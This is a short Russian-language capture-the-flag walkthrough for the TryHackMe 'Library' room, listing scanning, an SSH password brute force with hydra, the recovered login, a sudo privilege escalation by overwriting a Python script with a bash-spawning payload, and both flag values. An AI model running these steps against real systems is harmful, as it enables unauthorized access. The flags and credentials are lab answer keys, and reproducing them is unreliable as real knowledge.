[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Library](https://tryhackme.com/r/room/bsidesgtlibrary) 

Всего 1 заданиe:
## Задание 1
Прочитать user.txt и root.txt

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sC -sV <IP>
gobuster dir --url http://<IP> --wordlist /data/src/wordlists/directory-list-2.3-medium.txt 
hydra -l meliodas -P /data/src/wordlists/rockyou.txt ssh://<IP>
# login: meliodas   password: iloveyou1
ssh meliodas@<IP>
cat user.txt
```
```commandline
6d488cbb3f111d135722c33cb635f4ec
```
корень.txt
```commandline
sudo -l
cat /home/meliodas/bak.py
rm -f bak.py

cat > bak.py << EOF
#!/usr/bin/env python
import pty
pty.spawn("/bin/bash")
EOF

sudo /usr/bin/python3 /home/meliodas/bak.py
cat /root/root.txt
```
```commandline
e8c8c6c256c35515d1d344ee0488c617
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)